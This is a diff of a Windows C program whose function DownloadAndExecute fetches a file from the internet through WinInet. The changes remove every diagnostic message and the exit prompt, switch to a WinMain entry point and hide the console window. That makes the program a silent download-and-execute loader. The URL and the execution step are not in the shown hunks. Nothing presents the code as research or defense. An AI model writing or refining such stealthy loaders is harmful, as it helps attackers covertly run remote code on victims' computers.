@@ -1,6 +1,5 @@
 #include <windows.h>
 #include <wininet.h>
-#include <stdio.h>
 
 #pragma comment(lib, "wininet.lib")
 
@@ -10,10 +9,7 @@ void DownloadAndExecute() {
         INTERNET_OPEN_TYPE_PRECONFIG,
         NULL, NULL, 0);
 
-    if (!hInternet) {
-        printf("InternetOpen failed: %lu\n", GetLastError());
-        return;
-    }
+    if (!hInternet) return;
 
     HINTERNET hFile = InternetOpenUrlA(
         hInternet,
@@ -23,7 +19,6 @@ void DownloadAndExecute() {
         0);
 
     if (!hFile) {
-        printf("InternetOpenUrl failed: %lu\n", GetLastError());
         InternetCloseHandle(hInternet);
         return;
     }
@@ -36,17 +31,12 @@ void DownloadAndExecute() {
         totalSize += bytesRead;
     }
 
-    printf("Downloaded %lu bytes.\n", totalSize);
-
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInternet);
 }
 
-int main() {
-    // ShowWindow(GetConsoleWindow(), SW_HIDE);
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     DownloadAndExecute();
-
-    printf("Press Enter to exit...\n");
-    getchar();
     return 0;
 }
